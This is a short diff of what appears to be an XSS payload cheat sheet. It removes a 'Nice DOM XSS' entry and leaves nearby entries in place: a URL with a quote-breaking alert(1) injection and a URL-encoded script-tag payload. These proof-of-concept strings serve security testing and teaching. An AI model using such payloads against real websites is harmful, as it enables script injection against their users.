@@ -21,13 +21,6 @@ this will cause Content-Disposition to throw its content into the file
 http://example.com/','z':alert(1)//
 ```
 
-
-**Nice DOM XSS:**
-```
-','z':alert(1)//
-http://example.com/','z':alert(1)//
-```
-
 **MALFORMED URL:**
 ```
 %3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e
